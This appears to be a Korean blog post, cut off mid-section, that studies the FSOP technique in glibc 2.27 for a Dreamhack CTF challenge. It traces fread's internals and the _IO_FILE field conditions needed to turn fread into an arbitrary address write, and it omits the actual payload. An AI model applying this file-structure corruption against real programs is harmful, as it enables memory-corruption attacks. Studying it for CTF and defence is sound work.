---
title: "FSOP 기법 정리 (File Structure Oriented Programming) in glibc 2.27"
description: "FSOP 기법을 공부한 내용을 정리합니다"
date: 2025-11-19 13:49:00 +0900
categories: [Security, System Hacking]
tags: [FSOP]
author: hyungin0505
toc: true
comments: true
# image:
#     path: /assets/img/
#     alt: image alternative text
pin: false
---

---

## _IO_FILE AAW (Dreamhack #367) - Arbitrary Address Write

드림핵 367번 문제 풀이를 설명하며 진행하고 싶지만 풀이 공유가 금지되어 있기 때문에 공격 페이로드는 제외하고 익스플로잇에 필요한 이론만 정리해보려 한다  
어차피 드림핵 결제도 안 해서 직접 분석해봐야 문제를 풀 수 있다..ㅠㅠ  

`_IO_FILE` 구조체와 파일 입출력과 관련된 함수의 동작을 파악하기 위해서 glibc 코드를 분석한다  
다만 여기서 설명하려 하는 FSOP 기법은 현재 최신 버전 glibc에서 막혀 있기 때문에 glibc 2.27 코드를 기준으로 분석한다  

가능하면 모든 함수들을 타고 들어가보면서 일일히 분석해보고 싶지만 막상 써보니까 분량상 너무 길어지기도 하고 가독성도 떨어지고 오히려 이해하기 힘들 수도 있기 때문에 개인적으로만 분석해보고 익스 원리와 이와 관련된 중요한 내용들만 정리해보려 한다  
<br>

---

### Code Analysis (glibc 2.27)

#### _IO_fread()

```c
// /libio/iofread.c

#include "libioP.h"

_IO_size_t
_IO_fread (void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)
{
  _IO_size_t bytes_requested = size * count;
  _IO_size_t bytes_read;
  CHECK_FILE (fp, 0);
  if (bytes_requested == 0)
    return 0;
  _IO_acquire_lock (fp);
  bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested);
  _IO_release_lock (fp);
  return bytes_requested == bytes_read ? count : bytes_read / size;
}
libc_hidden_def (_IO_fread)

weak_alias (_IO_fread, fread)
```

`weak_alias()`로 `fread()` 함수를 호출하면 `_IO_fread()` 함수와 같은 동작을 수행하도록 되어 있다  
<br>

---

```c
// /include/libc-symbols.h

/* Define ALIASNAME as a weak alias for NAME.
   If weak aliases are not available, this defines a strong alias.  */
# define weak_alias(name, aliasname) _weak_alias (name, aliasname)
# define _weak_alias(name, aliasname) \
  extern __typeof (name) aliasname __attribute__ ((weak, alias (#name)));
```

`weak_alias()`에 대한 정의는 `/include/libc-symbols.h`{: .filepath}에서 정의되어 있다  
weak 심볼과 관련된 내용은 [여기](https://en.wikipedia.org/wiki/Weak_symbol)에서도 자세히 확인할 수 있다  

그냥 간단하게 `aliasname`을 호출하면 `name`의 동작을 한다 정도로 생각해도 좋을 것 같다  
<br>

---

```c
// /libio/iofread.c

_IO_size_t
_IO_fread (void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)
{
  _IO_size_t bytes_requested = size * count;
  _IO_size_t bytes_read;
  CHECK_FILE (fp, 0);
  if (bytes_requested == 0)
    return 0;
  _IO_acquire_lock (fp);
  bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested);
  _IO_release_lock (fp);
  return bytes_requested == bytes_read ? count : bytes_read / size;
}
```

`fread()`를 호출했을 때와 같은 동작을 하는 `_IO_fread()` 함수는 `buf`, `size`, `count`와 `fp` 인자를 받는다  

- `buf`는 `fp` 파일 구조체에서 읽은 데이터를 저장할 버퍼 포인터이다  
- `size`에는 버퍼 배열에 저장될 원소 하나의 크기로, 버퍼가 어떤 크기의 배열로 저장될 지 결정한다  
- `count`에는 버퍼에 저장할 배열 원소의 개수를 받는다  
- `fp`는 파일 구조체를 가리키는 포인터로 `fopen` 함수를 통해 얻을 수 있다  
<br>

---

```c
// /libio/iofread.c

_IO_size_t
_IO_fread (void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)
{
  _IO_size_t bytes_requested = size * count;
  _IO_size_t bytes_read;
  CHECK_FILE (fp, 0);
  if (bytes_requested == 0)
    return 0;
  _IO_acquire_lock (fp);
  bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested);
  _IO_release_lock (fp);
  return bytes_requested == bytes_read ? count : bytes_read / size;
}
```

`bytes_requested`에는 `size`*`count`를 하여 버퍼 배열의 전체 크기가 저장된다  
`byte_requested`가 0이면 당연히 읽을 필요가 없으므로 0을 반환하며 종료한다  

`CHECK_FILE`에서는 `fp`의 `_IO_file_flags`의 매직 마스크를 검사하여 제대로 된 파일 구조체인지 검사하는데 이와 관련된 내용은 후술하겠다  
아무튼 `fp`가 파일 구조체가 아니면 0을 리턴하게 된다  

`_IO_sgetn()` 함수를 호출하는데 `_IO_fread()`에서 인자로 받았던 `fp`, `buf` 그리고 `bytes_requested`를 전달한다  

모든 동작을 마치고 나면 읽은 바이트 수와 `bytes_requested`가 일치하면 (지정한 길이만큼 성공적으로 읽은 경우) 읽은 배열의 원소 수를 반환한다  
<br>

---

#### _IO_sgetn()

```c
// /libio/genops.c

_IO_size_t
_IO_sgetn (_IO_FILE *fp, void *data, _IO_size_t n)
{
  /* FIXME handle putback buffer here! */
  return _IO_XSGETN (fp, data, n);
}
libc_hidden_def (_IO_sgetn)
```

`_IO_fread()`에서 호출되는 `_IO_sgetn()`은 `/libio/genops.c`{: .filepath}에 정의되어 있다  

`fp`는 읽을 파일, `data`는 읽어서 저장할 버퍼, `n`은 배열 전체의 크기로, `_IO_XSGETN`에 그대로 똑같이 들어간다  
<br>

---

#### _IO_XSGETN()

<details markdown="1">

<summary>/libio/libioP.h</summary>

```c
// /libio/libioP.h

#define _IO_JUMPS_FILE_plus(THIS) \
  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)

...

# define _IO_JUMPS_FUNC(THIS) \
  (IO_validate_vtable                                                   \
   (*(struct _IO_jump_t **) ((void *) &_IO_JUMPS_FILE_plus (THIS)	\
	 		     + (THIS)->_vtable_offset)))

...

#define JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1, X2)

...

#define _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)

...

/* Check if unknown vtable pointers are permitted; otherwise,
   terminate the process.  */
void _IO_vtable_check (void) attribute_hidden;

/* Perform vtable pointer validation.  If validation fails, terminate
   the process.  */
static inline const struct _IO_jump_t *
IO_validate_vtable (const struct _IO_jump_t *vtable)
{
  /* Fast path: The vtable pointer is within the __libc_IO_vtables
     section.  */
  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
  const char *ptr = (const char *) vtable;
  uintptr_t offset = ptr - __start___libc_IO_vtables;
  if (__glibc_unlikely (offset >= section_length))
    /* The vtable pointer is not in the expected section.  Use the
       slow path, which will terminate the process if necessary.  */
    _IO_vtable_check ();
  return vtable;
}
```

</details>

```c
#define JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1, X2)

...

#define _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)
```

결과적으로 `_IO_XSGETN(FP, DATA, N)`을 호출하면  
`_IO_JUMPS_FUNC(FP)`의 멤버 중 `__xsgetn`을 호출하게 된다  
이때 `__xsgetn`의 인자로는 `FP`, `DATA`, `N`이 들어간다  
<br>

---

```c
// /libio/libioP.h

/* Type of MEMBER in struct type TYPE.  */
#define _IO_MEMBER_TYPE(TYPE, MEMBER) __typeof__ (((TYPE){}).MEMBER)

/* Essentially ((TYPE *) THIS)->MEMBER, but avoiding the aliasing
   violation in case THIS has a different pointer type.  */
#define _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER)        \
  (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \
				       + offsetof(TYPE, MEMBER)))

#define _IO_JUMPS(THIS) (THIS)->vtable
#define _IO_JUMPS_FILE_plus(THIS) \
  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)

...

# define _IO_JUMPS_FUNC(THIS)                                     \
  (IO_validate_vtable                                             \
   (*(struct _IO_jump_t **) ((void *) &_IO_JUMPS_FILE_plus (THIS)	\
			     + (THIS)->_vtable_offset)))
```

그러면 `_IO_JUMPS_FUNC(FP)`의 동작은 무엇인지 봐야 한다    

<details markdown="1">
<summary>Macro</summary>

분석하기 위해 필요한 매크로들을 하나하나 해석해보면 `_IO_MEMBER_TYPE`에서는 `__typeof__`를 사용하여 `TYPE` 타입의 빈 배열의 멤버 타입을 가져와 결과적으로는 `MEMBER`의 타입을 얻는다  

`_IO_CAST_FIELD_ACCESS`는 `THIS`(주로 파일 디스크립터)에서 `TYPE` 타입을 가진 `MEMBER`가 위치한 메모리 주소를 얻어 접근한다    
<br>

> 1. `offsetof`로 `MEMBER`가 `TYPE` 사이의 오프셋을 구한다  
> 2. `THIS`에 오프셋을 더해 `MEMBER`의 주소를 얻는다  
> 3. 해당 주소를 `MEMBER`의 타입 포인터로 지정 후 참조한다  
{: .prompt-info}
<br>

```c
// /libio/libioP.h

/* We always allocate an extra word following an _IO_FILE.
   This contains a pointer to the function jump table used.
   This is for compatibility with C++ streambuf; the word can
   be used to smash to a pointer to a virtual function table. */

struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};
```

위 매크로들을 토대로 해석하면 `_IO_JUMPS_FILE_plua`는 `_IO_FILE_plus` 구조체 내부 `vtable` 멤버에 접근한다  

</details>

`_IO_JUMPS_FUNC(THIS)`는 `_IO_JUMPS_FILE_plus (THIS)`의 리턴값인 `vtable` 멤버에 `_vtable_offset`을 더하여 실제 `vtable` 주소를 `_IO_jump_t` 구조체로 캐스트하고 참조한다  
이렇게 얻은 `vtable` 포인터를 `IO_validate_vtable()`에 넘겨서 검증한다  
검증을 마치고 나면 그 리턴값을 사용한다 (검증을 제대로 통과하면 `vtable`을 그대로 반환한다)  
<br>

---

```c
// /libio/libioP.h

#define JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1, X2)

...

#define _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)
```

그러면 결과적으로 `_IO_XSGETN()`은 `JUMP2`를 호출하게 되고, `JUMP2`는 `FP` 구조체 `vtable`의 `__xsgetn`을 호출하게 된다  
<br>

---

#### __xsgetn

```c
// /libio/libioP.h

struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};
```

`_IO_jump_t` 구조체에서 `__xsgetn`은 `_IO_xsgetn_t`를 타입을 가진다  
`__xsgetn` 위치에 어떤 함수의 포인터가 있느냐에 따라 동작이 결정되는데 해당 위치에 어떤 함수의 포인터가 들어가는지 확인할 수 있는 코드는 찾지 못했다..  
나중에 다시 확인해 볼 때가 오게 되서 찾게 된다면 추가하겠다  
<br>

---

```c
// /libio/fileops.c

const struct _IO_jump_t _IO_file_jumps libio_vtable =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_file_finish),
  JUMP_INIT(overflow, _IO_file_overflow),
  JUMP_INIT(underflow, _IO_file_underflow),
  JUMP_INIT(uflow, _IO_default_uflow),
  JUMP_INIT(pbackfail, _IO_default_pbackfail),
  JUMP_INIT(xsputn, _IO_file_xsputn),
  JUMP_INIT(xsgetn, _IO_file_xsgetn),
  JUMP_INIT(seekoff, _IO_new_file_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_new_file_setbuf),
  JUMP_INIT(sync, _IO_new_file_sync),
  JUMP_INIT(doallocate, _IO_file_doallocate),
  JUMP_INIT(read, _IO_file_read),
  JUMP_INIT(write, _IO_new_file_write),
  JUMP_INIT(seek, _IO_file_seek),
  JUMP_INIT(close, _IO_file_close),
  JUMP_INIT(stat, _IO_file_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
libc_hidden_data_def (_IO_file_jumps)
```

`/libio/fileops.c`{: .filepath}에 이런 코드가 있긴 하나 이 내용이 들어가는 로직을 찾지 못해서 동적으로 분석해보기로 한다  
<br>

---

```c
// Dreamhack 367 코드 일부

#include <stdio.h>
#include <unistd.h>
#include <string.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int main() {
  FILE *fp;

  char file_buf[1024];

  init();

  fp = fopen("/etc/issue", "r");

  printf("Data: ");

  read(0, fp, 300);

  fread(file_buf, 1, sizeof(file_buf)-1, fp);

  ...

  fclose(fp);
}
```

위처럼 `fopen()`으로 `fp`를 얻고 `fread()`를 하는 코드로 동적 분석을 해보도록 하자  
<br>

---

![Image](/assets/img/251102_0/_IO_FILE_plus.png)

pwndbg로 `fopen()`을 호출한 후 RAX 레지스터에는 `fopen()`의 리턴값인 파일 포인터가 들어있다   
해당 파일 포인터를 `_IO_FILE_plus` 구조체로 출력하면 `_IO_FILE` 구조체와 `vtable`의 주소가 나온다  
<br>

---

![Image](/assets/img/251102_0/symbol_xsgetn.png)

`vtable` 안에 있는 `__xsgetn`에 있는 주소의 심볼을 확인하면 `_IO_file_xsgetn`인 것을 알 수 있다  
(심볼에 `__Gl__`이 붙어있는데 이건 전역에 적용된다는 의미이다)  

따라서 `__xsgetn`은 `_IO_file_xsgetn`으로 이어진다  

지금까지의 내용을 정리하면 `fread()` -> `_IO_fread()` -> `_IO_sgetn()` -> `_IO_XSGETN()` -> `__xsgetn` -> `_IO_file_xsgetn()`의 흐름으로 진행된다  
<br>

---

#### _IO_file_xsgetn()

<details markdown="1">

<summary>_IO_file_xsgetn()</summary>

```c
// /libio/fileops.c

_IO_size_t
_IO_file_xsgetn (_IO_FILE *fp, void *data, _IO_size_t n)
{
  _IO_size_t want, have;
  _IO_ssize_t count;
  char *s = data;

  want = n;

  if (fp->_IO_buf_base == NULL)
    {
      /* Maybe we already have a push back pointer.  */
      if (fp->_IO_save_base != NULL)
	{
	  free (fp->_IO_save_base);
	  fp->_flags &= ~_IO_IN_BACKUP;
	}
      _IO_doallocbuf (fp);
    }

  while (want > 0)
    {
      have = fp->_IO_read_end - fp->_IO_read_ptr;
      if (want <= have)
	{
	  memcpy (s, fp->_IO_read_ptr, want);
	  fp->_IO_read_ptr += want;
	  want = 0;
	}
      else
	{
	  if (have > 0)
	    {
	      s = __mempcpy (s, fp->_IO_read_ptr, have);
	      want -= have;
	      fp->_IO_read_ptr += have;
	    }

	  /* Check for backup and repeat */
	  if (_IO_in_backup (fp))
	    {
	      _IO_switch_to_main_get_area (fp);
	      continue;
	    }

	  /* If we now want less than a buffer, underflow and repeat
	     the copy.  Otherwise, _IO_SYSREAD directly to
	     the user buffer. */
	  if (fp->_IO_buf_base
	      && want < (size_t) (fp->_IO_buf_end - fp->_IO_buf_base))
	    {
	      if (__underflow (fp) == EOF)
		break;

	      continue;
	    }

	  /* These must be set before the sysread as we might longjmp out
	     waiting for input. */
	  _IO_setg (fp, fp->_IO_buf_base, fp->_IO_buf_base, fp->_IO_buf_base);
	  _IO_setp (fp, fp->_IO_buf_base, fp->_IO_buf_base);

	  /* Try to maintain alignment: read a whole number of blocks.  */
	  count = want;
	  if (fp->_IO_buf_base)
	    {
	      _IO_size_t block_size = fp->_IO_buf_end - fp->_IO_buf_base;
	      if (block_size >= 128)
		count -= want % block_size;
	    }

	  count = _IO_SYSREAD (fp, s, count);
	  if (count <= 0)
	    {
	      if (count == 0)
		fp->_flags |= _IO_EOF_SEEN;
	      else
		fp->_flags |= _IO_ERR_SEEN;

	      break;
	    }

	  s += count;
	  want -= count;
	  if (fp->_offset != _IO_pos_BAD)
	    _IO_pos_adjust (fp->_offset, count);
	}
    }

  return n - want;
}
libc_hidden_def (_IO_file_xsgetn)
```

</details>

```c
_IO_file_xsgetn (_IO_FILE *fp, void *data, _IO_size_t n)
```

`_IO_file_xsgetn()` 함수 내에서 `fp` 구조체의 멤버들을 확인하기에 `fp` 구조체인 `_IO_FILE`에 어떤 멤버가 있는지 봐두는 게 좋다  
<br>

---

<details markdown="1">
<summary>_IO_FILE</summary>

```c
// /libio/bits/libio.h

struct _IO_FILE {
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;	/* Current read pointer */
  char* _IO_read_end;	/* End of get area. */
  char* _IO_read_base;	/* Start of putback+get area. */
  char* _IO_write_base;	/* Start of put area. */
  char* _IO_write_ptr;	/* Current put pointer. */
  char* _IO_write_end;	/* End of put area. */
  char* _IO_buf_base;	/* Start of reserve area. */
  char* _IO_buf_end;	/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```

![Image](/assets/img/251102_0/_IO_FILE.png)

`fopen()` 함수에 브포를 걸고 호출한 후 `RAX` 레지스터 값을 `_IO_FILE` 구조체 형식으로 출력해보면 위와 같다  

</details>

일단 다른 부분들을 보기 전에 익스에 필요한 부분부터 본다  
<br>

---

```c
 /* If we now want less than a buffer, underflow and repeat
  the copy.  Otherwise, _IO_SYSREAD directly to
  the user buffer. */
if (fp->_IO_buf_base
    && want < (size_t) (fp->_IO_buf_end - fp->_IO_buf_base))
  {
    if (__underflow (fp) == EOF)
break;

    continue;
  }
```

이런 코드가 있다  
`_IO_buf_base`를 검사하며 `__underflow()` 함수를 호출한다  
이 부분이 나중에 필요하니 알아두자  
<br>

---

#### __underflow()

```c
// /libio/genops.c

int
__underflow (_IO_FILE *fp)
{
  if (_IO_vtable_offset (fp) == 0 && _IO_fwide (fp, -1) != -1)
    return EOF;

  if (fp->_mode == 0)
    _IO_fwide (fp, -1);
  if (_IO_in_put_mode (fp))
    if (_IO_switch_to_get_mode (fp) == EOF)
      return EOF;
  if (fp->_IO_read_ptr < fp->_IO_read_end)
    return *(unsigned char *) fp->_IO_read_ptr;
  if (_IO_in_backup (fp))
    {
      _IO_switch_to_main_get_area (fp);
      if (fp->_IO_read_ptr < fp->_IO_read_end)
	return *(unsigned char *) fp->_IO_read_ptr;
    }
  if (_IO_have_markers (fp))
    {
      if (save_for_backup (fp, fp->_IO_read_end))
	return EOF;
    }
  else if (_IO_have_backup (fp))
    _IO_free_backup_area (fp);
  return _IO_UNDERFLOW (fp);
}
libc_hidden_def (__underflow)
```

이는 결국 `_IO_UNDERFLOW()`를 호출한다  
<br>

---

```c
#define JUMP0(FUNC, THIS) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS)

...

#define _IO_UNDERFLOW(FP) JUMP0 (__underflow, FP)
```

이전에 `__xsgetn`을 사용하던 것과 비슷한 방식으로 진행된다  
<br>

---

```c
// /libio/fileops.c

const struct _IO_jump_t _IO_file_jumps libio_vtable =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_file_finish),
  JUMP_INIT(overflow, _IO_file_overflow),
  JUMP_INIT(underflow, _IO_file_underflow),
  JUMP_INIT(uflow, _IO_default_uflow),
  JUMP_INIT(pbackfail, _IO_default_pbackfail),
  JUMP_INIT(xsputn, _IO_file_xsputn),
  JUMP_INIT(xsgetn, _IO_file_xsgetn),
  JUMP_INIT(seekoff, _IO_new_file_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_new_file_setbuf),
  JUMP_INIT(sync, _IO_new_file_sync),
  JUMP_INIT(doallocate, _IO_file_doallocate),
  JUMP_INIT(read, _IO_file_read),
  JUMP_INIT(write, _IO_new_file_write),
  JUMP_INIT(seek, _IO_file_seek),
  JUMP_INIT(close, _IO_file_close),
  JUMP_INIT(stat, _IO_file_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
libc_hidden_data_def (_IO_file_jumps)
```

`__xsgetn`이 어떤 함수로 점프하는지 찾았던대로 `__underflow`도 똑같이 해보면 일단 `_IO_file_underflow`로 점프하는 것을 알 수 있다  
<br>

---

![Image](/assets/img/251102_0/_IO_file_underflow.png)

실제로 gdb로 디버깅을 해보면 `__underflow` 내에서 `_IO_file_underflow`로 점프한다  
<br>

---

```c
// /libio/fileops.c

versioned_symbol (libc, _IO_new_do_write, _IO_do_write, GLIBC_2_1);
versioned_symbol (libc, _IO_new_file_attach, _IO_file_attach, GLIBC_2_1);
versioned_symbol (libc, _IO_new_file_close_it, _IO_file_close_it, GLIBC_2_1);
versioned_symbol (libc, _IO_new_file_finish, _IO_file_finish, GLIBC_2_1);
versioned_symbol (libc, _IO_new_file_fopen, _IO_file_fopen, GLIBC_2_1);
versioned_symbol (libc, _IO_new_file_init, _IO_file_init, GLIBC_2_1);
versioned_symbol (libc, _IO_new_file_setbuf, _IO_file_setbuf, GLIBC_2_1);
versioned_symbol (libc, _IO_new_file_sync, _IO_file_sync, GLIBC_2_1);
versioned_symbol (libc, _IO_new_file_overflow, _IO_file_overflow, GLIBC_2_1);
versioned_symbol (libc, _IO_new_file_seekoff, _IO_file_seekoff, GLIBC_2_1);
versioned_symbol (libc, _IO_new_file_underflow, _IO_file_underflow, GLIBC_2_1);
versioned_symbol (libc, _IO_new_file_write, _IO_file_write, GLIBC_2_1);
versioned_symbol (libc, _IO_new_file_xsputn, _IO_file_xsputn, GLIBC_2_1);
```

근데 `_IO_file_underflow()` 심볼이 `_IO_new_file_underflow()`로 매칭되어 있으므로 실제로는 `_IO_new_file_underflow()` 함수의 동작을 하게 된다   

실제로 `_IO_file_underflow()` 심볼을 가진 함수에 대한 정의는 찾지 못했다..  
<br>

---

#### _IO_new_file_underflow()

<details markdown="1">
<summary>_IO_new_file_underflow()</summary>

```c
// /libio/fileops.c

int
_IO_new_file_underflow (_IO_FILE *fp)
{
  _IO_ssize_t count;
#if 0
  /* SysV does not make this test; take it out for compatibility */
  if (fp->_flags & _IO_EOF_SEEN)
    return (EOF);
#endif

  if (fp->_flags & _IO_NO_READS)
    {
      fp->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
  if (fp->_IO_read_ptr < fp->_IO_read_end)
    return *(unsigned char *) fp->_IO_read_ptr;

  if (fp->_IO_buf_base == NULL)
    {
      /* Maybe we already have a push back pointer.  */
      if (fp->_IO_save_base != NULL)
	{
	  free (fp->_IO_save_base);
	  fp->_flags &= ~_IO_IN_BACKUP;
	}
      _IO_doallocbuf (fp);
    }

  /* Flush all line buffered files before reading. */
  /* FIXME This can/should be moved to genops ?? */
  if (fp->_flags & (_IO_LINE_BUF|_IO_UNBUFFERED))
    {
#if 0
      _IO_flush_all_linebuffered ();
#else
      /* We used to flush all line-buffered stream.  This really isn't
	 required by any standard.  My recollection is that
	 traditional Unix systems did this for stdout.  stderr better
	 not be line buffered.  So we do just that here
	 explicitly.  --drepper */
      _IO_acquire_lock (_IO_stdout);

      if ((_IO_stdout->_flags & (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))
	  == (_IO_LINKED | _IO_LINE_BUF))
	_IO_OVERFLOW (_IO_stdout, EOF);

      _IO_release_lock (_IO_stdout);
#endif
    }

  _IO_switch_to_get_mode (fp);

  /* This is very tricky. We have to adjust those
     pointers before we call _IO_SYSREAD () since
     we may longjump () out while waiting for
     input. Those pointers may be screwed up. H.J. */
  fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;
  fp->_IO_read_end = fp->_IO_buf_base;
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end
    = fp->_IO_buf_base;

  count = _IO_SYSREAD (fp, fp->_IO_buf_base,
		       fp->_IO_buf_end - fp->_IO_buf_base);
  if (count <= 0)
    {
      if (count == 0)
	fp->_flags |= _IO_EOF_SEEN;
      else
	fp->_flags |= _IO_ERR_SEEN, count = 0;
  }
  fp->_IO_read_end += count;
  if (count == 0)
    {
      /* If a stream is read to EOF, the calling application may switch active
	 handles.  As a result, our offset cache would no longer be valid, so
	 unset it.  */
      fp->_offset = _IO_pos_BAD;
      return EOF;
    }
  if (fp->_offset != _IO_pos_BAD)
    _IO_pos_adjust (fp->_offset, count);
  return *(unsigned char *) fp->_IO_read_ptr;
}
libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)
```

</details>

```c
// / libio/fileops.c

count = _IO_SYSREAD (fp, fp->_IO_buf_base,
		       fp->_IO_buf_end - fp->_IO_buf_base);
```

`fp`의 멤버들 중 플래그나 몇 가지 것들을 확인한 후 가장 중요한 `_IO_SYSREAD()`를 호출한다  
<br>

---

#### _IO_SYSREAD()

```c
// /libio/libioP.h

#define _IO_SYSREAD(FP, DATA, LEN) JUMP2 (__read, FP, DATA, LEN)
```

아까와 같다..  
`_IO_file_jumps libio_vtable`을 확인하면 `_IO_file_read`를 호출하는 것을 볼 수 있다  
<br>

---

![Image](/assets/img/251102_0/_IO_file_read.png)

마찬가지로 gdb로 확인해서 확정 지을 수 있다  
<br>

---

#### _IO_file_read()

```c
// /libio/fileops.c

_IO_ssize_t
_IO_file_read (_IO_FILE *fp, void *buf, _IO_ssize_t size)
{
  return (__builtin_expect (fp->_flags2 & _IO_FLAGS2_NOTCANCEL, 0)
	  ? __read_nocancel (fp->_fileno, buf, size)
	  : __read (fp->_fileno, buf, size));
}
libc_hidden_def (_IO_file_read)
```

`_flags2` 확인 후 내부적으로 또 `__read()` 함수를 호출한다  
이때 인자로는 `fp`가 아닌 `fp` 구조체의 `_fileno` 멤버가 들어간다  
<br>

---

![Image](/assets/img/251102_0/read.png)

여기서의 `__read()`는 `read()`로 점프한다  
사실 이 부분은 코드에서 확인하지는 못했고 gdb로만 확인했다..  

이전에 gdb로 확인했던 것들도 코드로 완벽하게 확인하지는 못했지만 어찌 됐든 gdb로 동적 디버깅해서 직접 동작 확인하는게 정확하긴 하니까..  
<br>

---

![Image](/assets/img/251102_0/flag.png)

그래서 이렇게 실행되는 `fread()` 속에 들어가는 파일 구조체를 조작하여 `read()`를 사용하면 AAW가 가능하다  
이를 위해서는 앞서 제대로 분석하지 않았던 플래그 검증이나 다른 `fp` 멤버 확인 조건문들을 만족시킬 건 만족시키고, 빠질 건 빠져야 한다  
<br>

---

### Exploit

#### _IO_SYSREAD 실행을 위한 조건 우회

`fread()` 함수를 실행했을 때 결국 `read()` 함수가 호출되도록 해야 하는데, `_IO_SYSREAD`에서 `read()`로 가는 플로우에 `_IO_FILE` 구조체 멤버 검증 과정이 없기 때문에 `_IO_new_file_underflow()` 함수에서 `_IO_SYSREAD`가 실행되도록 하기 위한 조건만 맞춰주면 된다  
<br>

그리고 해당 문제에서는 일단 `fread()`를 정상적으로 실행할 필요는 없고 AAW로 스택에 위치한 지역 변수 하나만 조작하면 플래그가 뽑히는 문제이다  
따라서, `_IO_SYSREAD` 이후의 조건까지 맞춰줄 필요가 없다  
<br>

---

```c
if (fp->_flags & _IO_NO_READS)
  {
    fp->_flags |= _IO_ERR_SEEN;
    __set_errno (EBADF);
    return EOF;
  }
```

`_flags` 플래그 비트에 `_IO_NO_READS`가 포함되어 있으면 EOF로 빠지므로 읽기 권한이 설정되어 있어야 한다  
<br>

<details markdown="1">
<summary>플래그 비트</summary>

```c
// /libio/bits/libio.h

#define _IO_MAGIC 0xFBAD0000 /* Magic number */
#define _OLD_STDIO_MAGIC 0xFABC0000 /* Emulate old stdio. */
#define _IO_MAGIC_MASK 0xFFFF0000
#define _IO_USER_BUF 1 /* User owns buffer; don't delete it on close. */
#define _IO_UNBUFFERED 2
#define _IO_NO_READS 4 /* Reading not allowed */
```

플래그 비트는 `/libio/bits/libio.h`{: filepath}에 정의되어 있다  

</details>
<br>

---

```c
if (fp->_IO_read_ptr < fp->_IO_read_end)
  return *(unsigned char *) fp->_IO_read_ptr;

if (fp->_IO_buf_base == NULL)
  {
    /* Maybe we already have a push back pointer.  */
    if (fp->_IO_save_base != NULL)
{
  free (fp->_IO_save_base);
  fp->_flags &= ~_IO_IN_BACKUP;
}
    _IO_doallocbuf (fp);
  }
```

`_IO_read_ptr`이 `_IO_read_end`보다 크거나 같아야 하고, `_IO_buf_base`가 NULL 값이면 안 된다  
<br>

---

```c
